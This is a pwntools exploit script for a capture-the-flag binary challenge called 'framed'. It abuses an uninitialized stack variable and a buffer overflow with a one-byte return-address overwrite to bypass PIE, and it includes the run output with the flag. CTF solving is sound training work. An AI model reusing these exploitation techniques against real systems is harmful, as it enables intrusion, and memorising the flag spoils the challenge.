#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_framed')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('framed.zajebistyc.tf', 17005)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./solve.py GDB
gdbscript = '''
tbreak main
# break *0x0000555555554aa3
continue
'''.format(**locals())

#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io      = start()
RBP_OFF = 0x30 # (rbp - dst_buffer) = 0x30


# prepping the stack frame for the next call
payload  = b'A'*(RBP_OFF)
payload += p64(0xcafebabedeadbeef) 
io.sendlineafter(b'name?', payload) 


# abusing `feeling_lucky()` and unlocking the hidden BOF 
io.sendlineafter(b'shuffles?', b'0') # 0 shuffling in order to abuse the uninitialized variables 
                                     # on the stack from the previous frame


# after winning the game, procceed with a regular stack-based BOF 
payload = b'B'*(RBP_OFF+0x8) 
payload += b'\x1b' # overwriting the LSB(least significant byte) of ret addr with '0x1b', this  
                    # allows to overcome ASLR. Because the `flag` function and 
                    # `main` are allocated in the same (random) page in memory,
                    # we can just overwrite the last byte to re-direct code execution
                    # to another function and not main without knowing the full random address.
io.recvuntil(b'Seems you')
io.send(payload)
io.interactive() # profit


# output:
# root@56bec2e1a941:~/host-share/omh2021/framed# python3 solve.py REMOTE
# [*] '/root/host-share/omh2021/framed/chall_framed'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to framed.zajebistyc.tf on port 17005: Done
# [*] Switching to interactive mode
# !
# Read 57 payload bytes
# flat{uninitialized_variables_are_not_really_uninitialized}
# [*] Got EOF while reading in interactive

